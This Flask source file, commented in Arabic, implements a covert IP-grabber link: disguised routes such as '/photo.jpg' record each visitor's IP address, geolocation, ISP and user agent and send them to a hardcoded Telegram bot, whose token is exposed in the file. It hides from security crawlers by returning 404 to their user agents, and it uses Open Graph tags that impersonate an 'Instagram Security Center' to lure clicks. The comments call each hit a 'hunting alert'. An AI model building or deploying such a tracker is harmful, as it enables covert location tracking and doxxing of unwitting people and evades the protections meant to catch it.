from flask import Flask, request
import requests

app = Flask(__name__)

# --- الإعدادات الأصلية 100% (نفس اللي في صورتك) ---
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        # السطر الأصلي كما هو لضمان وصول الرسائل
        requests.post(url, json=payload, timeout=5)
    except:
        pass

@app.route('/')
@app.route('/check-status')
@app.route('/photo.jpg') # نظرية الامتداد المزيف
def track():
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ua_lower = user_agent.lower()

    # --- الخطة (ب): فلترة "الرأس المقطوع" وبوتات الحماية ---
    # إذا كان الزائر بوت (Amazon, Vercel, Facebook) الذي يظهر في صورك
    if any(bot in ua_lower for bot in ['amazon', 'vercel', 'facebook', 'headlesschrome']):
        return "404 Not Found", 404

    # --- الخطة (أ): تدوير الروابط (Link Rotation) ---
    v_param = request.args.get('v', '1') # لجلب القيمة مثل ?v=2

    try:
        # جلب الموقع الجغرافي (نفس كودك الأصلي)
        geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
        city = geo_res.get('city', 'Unknown')
        country = geo_res.get('country', 'Unknown')
        isp = geo_res.get('isp', 'Unknown')
    except:
        city = country = isp = "Error"

    # التنسيق الأصلي للتقرير
    report = (
        f"🎯 <b>تنبيه صيد (خطة شاملة)!</b>\n"
        f"--------------------------\n"
        f"🆔 <b>الإصدار:</b> v={v_param}\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📍 <b>الموقع:</b> {city}, {country}\n"
        f"🏢 <b>المزود:</b> {isp}\n"
        f"📱 <b>الجهاز:</b> {user_agent[:50]}...\n"
        f"--------------------------"
    )
    
    # الإرسال عبر دالتك الأصلية
    send_to_telegram(report)
    
    # الخطة (ج): التمويه و og:type للصيد بدون ضغط
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta property="og:title" content="Instagram Security Center">
        <meta property="og:description" content="Verify your account identity.">
        <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
        <meta property="og:type" content="video.other">
    </head>
    <body style="background:black; color:white; text-align:center;">
        <h1>404 Not Found</h1>
    </body>
    </html>
    """, 200

if __name__ == '__main__':
    app.run()
